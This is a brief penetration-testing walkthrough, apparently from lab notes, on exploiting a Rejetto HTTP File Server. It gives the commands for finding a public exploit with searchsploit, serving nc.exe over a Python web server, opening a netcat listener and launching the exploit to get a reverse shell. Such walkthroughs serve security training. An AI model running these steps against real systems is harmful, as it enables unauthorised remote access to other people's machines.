### How to setup exploit files ?

1. Run a `nmap` service version detection scan. In our case, the target is running a web server on port 80.

2. Upon further analysis we discover that the target is running a `Rejetto` HTTP file server.

3. Search publicly available exploits for it using `searchsploit`.

4. We will copy the exploit code to our `pwd`.
```
searchsploit -m <EDBID>
```
- EDBID - ExploitDB ID.

5. We can use a text editor to open and analyse the exploit script. The script should contain the instructions pertinent to the exploit.

6. In our case, we need to host a web server hosting `nc.exe` (netcat exe file) and also edit in our local IP and port number in the exploit code. 

7. We'll now copy the `nc.exe` file to our `pwd`.
```
cp /usr/share/windows-resources/binaries/nc.exe .
```

8. We'll now setup our `SimpleHTTPServer` to host the contents of our `pwd`.
```
python -m SimpleHTTPServer 80
```

9. Start a `nc` listener on the port we added in the code as specified in the instructions in our exploit code.
```
nc -nlvp <port-number>
```

9. Now we can launch our exploit file in another terminal.
```
python <EDBID>.py <target-ip> 80
```

10. On our web server we should see a few GET requests. We should also see a reverse shell in our `nc` listener.
